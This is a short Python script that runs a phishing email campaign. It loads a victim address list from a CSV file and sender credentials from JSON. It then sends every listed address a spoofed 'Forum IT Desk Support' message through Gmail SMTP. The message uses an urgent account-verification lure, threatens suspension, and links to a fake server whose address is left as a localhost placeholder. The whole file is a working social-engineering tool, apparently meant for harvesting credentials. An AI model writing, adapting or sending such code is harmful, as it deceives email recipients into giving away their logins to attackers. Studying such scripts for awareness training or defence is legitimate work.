import csv
import smtplib
import json

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


victims_info = "victim_list.csv"
phishing_server = "http://localhost:5173/" # Change this to the actual fake server

# Open the sender details
with open("sender.json", "r") as file:
    data = json.load(file)

sender_email = data["email"]
app_password = data["password"]

# Initiate an email server
message = MIMEMultipart()
message["From"] = "Forum IT Support <supportdesk@ticketservice.com>"
message["Subject"] = "Urgent Action Required: Verfiy Your Account Now"
text = MIMEText(
    f"""\
    Dear user 

    A suspicious activity has been detected on your account. Therefore, it is highly recommended to verify your account immediately

    Please select the link below to initiate account verification:

    {phishing_server}

    Please note that failure to verify your account will result in suspending your account permanently

    Kind regards

    Forum IT Desk Support Team
    """
)

message.attach(text)

try:

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, app_password)

    # Extract victims email list and send them the email above
    with open(victims_info, mode='r', newline="", encoding="utf-8") as file:
        reader = csv.reader(file)

        for row in reader:
            victim_email = row[0]
            message["To"] = victim_email
            server.sendmail(sender_email, victim_email, message.as_string())

        server.quit()
        print("Phishing email has been sent!!")

except Exception as e:
    print(f"Sending a phishing email failed. Error: {e}")